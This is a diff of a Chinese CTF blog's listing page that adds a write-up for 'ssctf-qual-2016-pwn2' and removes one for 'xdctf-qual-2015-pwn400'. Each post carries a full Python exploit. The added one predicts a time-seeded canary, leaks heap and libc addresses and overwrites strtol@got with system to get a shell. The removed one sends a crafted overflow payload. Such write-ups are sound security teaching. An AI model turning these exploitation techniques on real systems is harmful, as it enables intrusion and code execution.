@@ -298,6 +298,140 @@
             
               
                 
+                <a class="post-title-link" href="/2016/09/03/ssctf-qual-2016-pwn2/" itemprop="url">
+                  ssctf-qual-2016-pwn2
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-03T00:00:00+08:00" content="2016-09-03">
+              2016-09-03
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/03/ssctf-qual-2016-pwn2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/03/ssctf-qual-2016-pwn2/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><h2 id="Bugs">Bugs</h2><ul>
+<li>integer overflow</li>
+<li>off by one bug</li>
+<li>psedu random</li>
+</ul>
+<p>题目和pwn400的差不多，就是多了一个以服务器时间作为种子生成的伪随机数在结构里当做<em>canary</em></p>
+<p>本地测试时，获取本地机器的时间，然后用c语言写一个生成伪随机的程序即可泄露出<em>canary</em>，在远程测试时，获取远程的服务器时间即可，不过由于网络延迟，所以加了一个-3~3的随机数作为误差，获取远程服务器时间的代码取自@<a href="https://github.com/RickGray" target="_blank" rel="external">RickGray</a>的一篇<a href="pwnable.kr">pwnable.kr-md5-calculator</a>的writeup<a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html" target="_blank" rel="external">[1]</a>，如下所示</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">date        = urllib2.urlopen(<span class="string">'remote-server'</span>).headers[<span class="string">'Date'</span>]</span><br><span class="line">leak_time   = int(time.mktime(time.strptime(date, <span class="string">'%a, %d %b %Y  %H:%M:%S %Z'</span>)))</span><br><span class="line">leak_time   += random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes, os, time, urllib2</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack pseudo-random</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        leak        = int(os.popen(<span class="string">'./leak '</span> + str(int(time.time()))).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        date        = urllib2.urlopen(<span class="string">'remote-server'</span>).headers[<span class="string">'Date'</span>]</span><br><span class="line">        leak_time   = int(time.mktime(time.strptime(date, <span class="string">'%a, %d %b %Y  %H:%M:%S %Z'</span>)))</span><br><span class="line">        leak_time   += random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">        leak        = int(os.popen(<span class="string">'./leak '</span> + str(int(leak_time))).read())</span><br><span class="line">    <span class="keyword">if</span> leak ^ <span class="number">0x40000000</span> &gt;= <span class="number">0x40000000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] random leak\t:\t'</span> + hex(leak)</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./pwn2-58461176'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment"># io.hint([0x80491e4])</span></span><br><span class="line"></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'sort'</span>, <span class="number">2</span>, leak ^ <span class="number">0x40000000</span>, <span class="number">0x40000000</span>])</span><br><span class="line">io.wl(<span class="number">3</span>)        <span class="comment"># sort</span></span><br><span class="line">io.wls([<span class="number">1</span>, <span class="number">2</span>])  <span class="comment"># query</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result:'</span>)</span><br><span class="line">heap_base = ctypes.c_uint32(int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>])).value - <span class="number">0x38</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap base\t:\t'</span> + hex(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">io.wls([<span class="number">2</span>, <span class="number">2</span>, heap_base + <span class="number">0x40</span>])</span><br><span class="line">io.wl(<span class="number">7</span>)        <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reload</span></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'reload'</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">got_strtol = <span class="number">0x804c01c</span></span><br><span class="line">idx = str((got_strtol + <span class="number">0x100000000</span> - (heap_base + <span class="number">0x58</span>)) / <span class="number">4</span>)</span><br><span class="line">io.wls([<span class="number">1</span>, idx])</span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result:'</span>)</span><br><span class="line">adr_strtol  = ctypes.c_uint32(int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>])).value</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak strtol\t: \t'</span> + hex(adr_strtol)</span><br><span class="line">off_strtol  = <span class="number">0x000345c0</span></span><br><span class="line">libc_base   = adr_strtol - off_strtol</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak libc\t: \t'</span> + hex(libc_base)</span><br><span class="line">off_system  = <span class="number">0x00040190</span></span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack strtol@got</span></span><br><span class="line">io.wls([<span class="number">2</span>, idx, ctypes.c_int32(adr_system).value])</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">io.rtl(<span class="string">'Choose:'</span>)</span><br><span class="line">io.wl_af(<span class="string">'Choose:'</span>, <span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><ol>
+<li><a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html" target="_blank" rel="external">http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/09/02/ssctf-qual-2016-pwn1/" itemprop="url">
                   ssctf-qual-2016-pwn1
                 </a>
@@ -704,132 +838,6 @@
             
               
                 
-                <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn400/" itemprop="url">
-                  xdctf-qual-2015-pwn400
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
-              2016-08-17
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/17/xdctf-qual-2015-pwn400/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn400/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试</p>
-<p><img src="/images/xdctf-qual-2015-pwn400/1.jpg" alt=""></p>
-<p><code>v13+2</code>不能过大，但是这里如果输入<code>0xffff</code>就会溢出，即可绕过判断</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = (<span class="string">'0'</span>, <span class="number">8888</span>)</span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'PK\x01\x02'</span></span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload += l32(<span class="number">0xffff</span>)</span><br><span class="line">payload += <span class="string">'B'</span> * <span class="number">14</span></span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">'C'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.read_until(<span class="string">'f'</span>)</span><br><span class="line">flag = <span class="string">'f'</span> + io.read_until(<span class="string">'&#125;'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
                 <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn200/" itemprop="url">
                   xdctf-qual-2015-pwn200
                 </a>
@@ -956,7 +964,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -997,7 +1005,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">30</span>
+              <span class="site-state-item-count">31</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1014,7 +1022,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">35</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
